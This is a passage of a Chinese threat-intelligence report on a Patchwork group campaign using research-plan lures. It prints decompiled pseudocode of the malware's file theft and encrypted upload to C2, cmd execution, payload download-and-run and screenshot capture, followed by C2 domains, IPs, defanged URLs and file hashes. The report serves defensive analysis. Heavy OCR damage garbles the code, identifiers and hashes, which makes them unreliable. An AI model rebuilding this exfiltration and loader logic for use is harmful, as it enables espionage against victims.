+）3hdfghd1：读取指定文件，加密后上传至C2  
+
+strcpy(v78,"CreateFileW");   
+v79 =0i64;   
+ProcAddress $=$ GetProcAddress(hModule, v78);   
+v13 = v68;   
+if（v68[5]>7u） v13 = v68[0];   
+dword_432684 $=$ ProcAddress;   
+hFile $=$ (ProcAddress)(v13, 0x80000000, 1, 0, 3, 128, 0);   
+V49 $=\times15$ V16 $=$ hFile;   
+SetFilePointer(hFile, v49,0,1u);   
+$\left|\vee87[9]=\Theta;\right.$ strcpy(v87, "ReadFile");   
+$\vee17=$ GetProcAddress(hModule,v87);   
+$\mathbf{\nabla}\vee18\mathbf{\nabla}=$ Block;   
+dword_4326AC $=\phantom{-}\cup17$ ；   
+(v17)(v16,Block,100000,&v67,0);   
+FirstEnc(&v69, v18, v67);   
+LOBYTE(v88) $=3$ ；   
+SecondEnc(&v70, &v69);   
+LOBYTE(v88) $=4$ memset(v23, 0, 0x30D40u);   
+strcpy(v24, "vovdw");   
+if （v71 >0xF)   
+$v25~=~\lor70$   
+sub_405BD0(v23，"%s=1110[(\*\*)]%s[(\*\*)]%s[(\*\*)]%s[（\*\*)]%s[（\*\*)]%s"，v24，v25，v59，v43，v46，v48） dword_4326A8(hInternet, v60, strlen(v60), v64, strlen(v64));   
+InternetCloseHandle(hInternet);   
+CloseHandle(hFile);  
+
+·3gjdfghj6：创建cmd进程执行指定指令，并将执行结果加密上传  
+
+wcscpy(String2,L"C:\\Windows\1System32\\cmd.exe /c");   
+lpString1 $\l=$ unknown_libname_3(2000);   
+memset(lpString1,0, 0x3E8u);   
+lstrcatW(lpString1,String2);   
+v18 $=$ lpString2;   
+if（lpString2[5]>7) $\downarrow18=$ lpString2[0];   
+lstrcatW(lpString1,v18);   
+V19 $=$ dword_4326B0(v78，1pString1，0,0,1,0x8000000,0,0,&v51,&v62);   
+CloseHandle(hobject);  
+
+3fgjfhg4：遍历文件及目录  
+
+strcpy(v111,"FindFirstFileW");   
+dword_432680 $\l=$ GetProcAddress(v16, v111); v110[9] $=\theta.$   
+\*&v110[7] $=6$   
+strcpy(v110,"FindNextFileW");   
+dword_4326B4 $=$ GetProcAddress(v16, v110);  
+
+）3gnfjhk7：从指定URL下载后续负载保存到本地执行  
+
+strcpy(v12, "URLOpenBlockingStreamA");   
+dword_4326BC $\l=$ GetProcAddress(v11, v12);   
+j_j_free(Block);   
+jjfree(v12);   
+if ( dword_4326BC(0, a2, &v67,0, 0) )   
+qmemcpy(v95,"CreateFi", 8);   
+v95[2] $=$ &loc_41656C;   
+dword_4326A4 $\l=$ GetProcAddress(hInternet,v95);   
+v18 $=$ (dword_4326A4)(v52，0x40000000，2,0，2，128，0);   
+if （v18 !=-1 )   
+{ \*&v103[5]= 0; $\vee1\theta4=\theta;$ strcpy(v103, "WriteFile"); ProcAddress $=$ GetProcAddress(hInternet, v103); $v2\Theta=\&v77$ if （v79>0xF） $v20~=~v77$ ； dword_4326c0 $=$ ProcAddress; (ProcAddress)(v18, v20, v78, &LastError, 0); CloseHandle(v18);   
+strcpy(v23,"CreateProcessA");   
+$\vee24=$ GetModuleHandleA("Kernel32.dll");   
+dword_4326C4 $=$ GetProcAddress(v24, v23);   
+(dword_4326C4)(v52，0，0,0,0，0,0,0，v72，v71);   
+jj_free(v64);   
+jjfree(v23);   
+FirstEnc(&v75, v52, strlen(v52));   
+LOBYTE(v105) = 4;   
+SecondEnc(&v76,&v75);  
+
+3ngjfng5：仅下载文件  
+3fghnbj2：屏幕截图  
+
+memset(&v71[1],0,12); CreateStreamOnHGlobal(0,1, &ppstm); GdiplusStartup(&v74, $\scriptstyle{\vee}71$ ，0);； nc/a)  
+
+以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析  
+
+HuL ueLUL(U), SystemMetrics $=$ GetSystemMetrics(1);   
+$\begin{array}{r l}{\mathbf{\nabla}\mathbf{\times}\mathbf{9}}&{{}=}\end{array}$ GetSystemMetrics(0);   
+CompatibleDC $=$ CreateCompatibleDc(hdc);   
+ho $=$ CreateCompatibleBitmap(hdc，v9，SystemMetrics);   
+SelectObject(CompatibleDC, ho);   
+BitBlt(CompatibleDC,0, 0, v9, SystemMetrics,hdc,0, 0, 0x40CC0020u);   
+$v62~=~\theta$ $v67~=$ 0i64;   
+LODWORD(v67) $\l=$ &Gdiplus::Bitmap::\`vftable';   
+v53=GdipCreateBitmapFromHBITMAP(ho，0,&v62);  
+
+）frgt45f：创建线程执行cmd指令  
+
+strcpy(ProcName,"CreateThread");   
+dword_432674 $\l=$ GetProcAddress(ModuleHandleA,ProcName);   
+hHandle $=$ (dword_432674)(0, 0, sub_40EC10,&a1,0, v35);   
+wcscpy(String2,L"C:\\Windows\ISystem32\\cmd.exe/c");   
+$\yen5=$ unknown_libname_3(2000);   
+lpString1 $=\vee5$ memset(v5,0, 0x7D0u);   
+lstrcatw(v5,String2);   
+v6 $=$ lpString2;   
+$\begin{array}{r l}{\mathbf{\nabla}\times\nabla~}&{{}=}\end{array}$ lpString1;   
+if（lpString2[5]>7) v6 $=$ lpstring2[0];   
+lstrcatW(lpString1, v6);   
+$\begin{array}{r l}{\operatorname{v}8}&{{}=}\end{array}$ dword_4326B0(v45, $v7$ ，0,0,1,0，0,0,&v25，&v36);   
+CloseHandle(hobject);  
+
+## 关联拓展  
+
+我们的狩猎规则捕获的Patchwork组织近期的其他攻击样本如下  
+
+两个LNK文件均上传自巴基斯坦，与本文分析的LNK文件连接的二级域名相同，释放的白 $^+$ 黑文件一致，仅在诱饵文件上有所不同。  
+
+此外，我们的狩猎规则还命中到该组织使用AsyncRAT的攻击链与本文相似的其他加载器。其中涉及的证书信息如下：  
+
+<html><body><table><tr><td>文件Hash</td><td>文件名</td></tr><tr><td>36c3aa180b8466d94b34397d786c913cc83bb33dbb1d6cc3bda 0c83bd2392122</td><td>SMSAPI_Gateway.pdf.lnk</td></tr><tr><td>30024cadaf9aead441d926132c2a83aa478aa153e02a5b248b4c 0dec33fcab94</td><td>Internal_Audit_Report.pdf.lnk</td></tr></table></body></html>
+
+file://E:/GoogleDownload/以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析(2024_12_6 14|59|59).html  
+
+  
+
+以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析  
+
+\*有关详细信息，请参考证书颁发机构的说明。  
+
+颁发给： Softwarebel s. r. o.  
+
+颁发者： SSL. com Code Signing Intermediate CA RSA R1  
+
+有效期从 2024/7/29到 2025/7/29  
+
+### 域名分析  
+
+#### weixein.info  
+
+域名注册于2024年11月8日，主页面仿冒加拿大新闻网站GlobalNews，点击任意新闻均会跳转至官方网站globalnews.ca  
+
+  
+
+该域名解析到的IP：91.245.255.60曾在24年7月绑定域名mingyn.org，经网络资产测绘，该域名同样为Patchwork组织资产。  
+
+#### sheicen.info  
+
+该域名是我们捕获的Patchwork众多恶意负载之一连接到的C2域名，我们通过网络资产测绘，发现了该组织于2024年11月25日注册的最新域名youdoa.info，该域名解析到146.70.113.198。目前未发现有关联样本。其主页仿冒北欧航空SAS，点击任意链接即跳转至官网flysas.com  
+
+  
+file://E:/GoogleDownload/以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析(2024_12_614|59|59).html  
+
+  
+
+# 6 10c  
+
+本次攻击活动中的文件Hash  
+12cf713242ae7eb11eceddbcc535f562f16e5be645f07a87e805e7f4f81b362a7250c63c0035065eeae6757854fa2ac3357bab9672c93b77672abf7b6f45920a通过基础设施及样本特征关联到的文件Hash  
+b66434960ea4669d66ddefa173b10207dd4d6bbc5c46f55b9c9e7706fd16f18e8143a7df9e65ecc19d5f5e19cdb210675fa16a940382c053724420f2bae4c8bd858f47433bbbac47ca53e2b525669ab130c460b3f1b2c8269cf1ee8e47477f1e0dbf54244cb9c115e59f9951c6450f91b684d6d5ec5e1a27be397b3b96ef5430c01a763ce686f464d2d633f16ddb37e2032b91c10f36e3f187760fb6d737422374ce1c5bfdfd095a974b5457aa13cb2912fd2f3fe00558793bdb02907dbfd3ce报告涉及URL及说明  
+
+<html><body><table><tr><td>URL</td><td>说明</td></tr><tr><td>hxxps://atus.toproid.xyz/klhju_rdf_gd/ktdfersfr</td><td>下载文件到本地C:\Users\Public\Project_Guidel ine.pdf</td></tr><tr><td>hxxps://zon.toproid.xyz/pfetc_ksr_lo/jyuecvdgt</td><td>下载文件到本地C:\Users\Public\WerFaultSecur e.exe</td></tr><tr><td>hxxps://zon.toproid.xyz/aewbfjsd_td/ktrgdysvt</td><td>下载文件到本地C:\Users\Public\wer.dll</td></tr><tr><td>hxxps://weixein.info/1WrCVzW4kSDNbNTt/cqWf4v QlofzqFkc7.php</td><td>窃密信息上传及后续负载下载地址</td></tr></table></body></html>  
+
+通过基础设施及样本特征关联到的URL及说明  
+
+<html><body><table><tr><td>URL</td><td>说明</td></tr><tr><td>/b+x+f/i、f+r+</td><td></td></tr></table></body></html>
+
+file://E:/GoogleDownload/以研发计划为诱饵，Patchwork组织近期针对国内的攻击活动分析(2024_12_614|59|59).html  
